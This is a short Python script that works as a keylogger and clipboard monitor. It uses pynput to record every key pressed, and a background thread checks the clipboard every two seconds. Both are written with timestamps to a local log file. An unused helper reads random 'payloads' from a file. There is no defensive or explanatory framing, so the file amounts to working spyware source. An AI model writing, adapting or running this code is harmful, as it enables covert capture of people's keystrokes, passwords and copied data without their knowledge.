
import threading
import time
import pyperclip
import random
from pynput import keyboard

LOG_PATH = 'logs/event_log.txt'
PAYLOADS_PATH = 'payloads/cryptic_payloads.txt'

last_clipboard = None

def log_event(event):
    with open(LOG_PATH, 'a') as f:
        f.write(f"[{time.ctime()}] {event}\n")

def get_poetic_payload():
    try:
        with open(PAYLOADS_PATH, 'r') as f:
            lines = f.read().split('\n\n')
            return random.choice(lines).strip()
    except Exception as e:
        return f"Payload error: {e}"

def clipboard_monitor():
    global last_clipboard
    while True:
        try:
            current = pyperclip.paste()
            if current != last_clipboard and current.strip() != '':
                log_event(f"Clipboard changed: '{current[:50]}'")
                last_clipboard = current
        except Exception as e:
            log_event(f"Clipboard monitor error: {e}")
        time.sleep(2)

def on_key_press(key):
    try:
        log_event(f"Key pressed: {key.char}")
    except AttributeError:
        log_event(f"Special key pressed: {key}")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()

def start_clipboard_thread():
    t = threading.Thread(target=clipboard_monitor, daemon=True)
    t.start()

def start_watcher():
    log_event("Watcher backend started.")
    start_clipboard_thread()
    start_keylogger()
    while True:
        time.sleep(60)

if __name__ == '__main__':
    start_watcher()
